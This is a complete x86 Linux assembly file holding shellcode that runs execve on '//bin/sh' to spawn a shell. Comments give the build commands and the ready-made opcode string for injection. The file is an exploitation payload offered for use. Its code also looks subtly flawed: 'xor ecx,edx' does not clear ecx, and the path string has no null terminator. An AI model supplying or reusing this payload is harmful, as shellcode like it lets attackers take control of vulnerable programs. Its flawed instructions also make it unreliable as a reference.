section .text:
	global _start
	_start:
		push ebp
		mov ebp,esp
		sub esp,10
		push 0x68732f6e
		push 0x69622f2f
		xor eax,eax
		add eax,0x0b
		mov ebx,esp
		xor edx,edx
		xor ecx,edx
		int 0x80

;compiler && linker
;nasm -f elf32 sh3llc0d3.asm && ld -o shell sh3llc0d3.o

;opcodes
;"\x55\x89\xE5\x83\xEC\x0A\x68\x6E\x2F\x73\x68\x68\x2F\x2F\x62\x69\x31\xC0\x83\xC0\x0B\x89\xE3\x31\xD2\x31\xD1\xCD\x80"
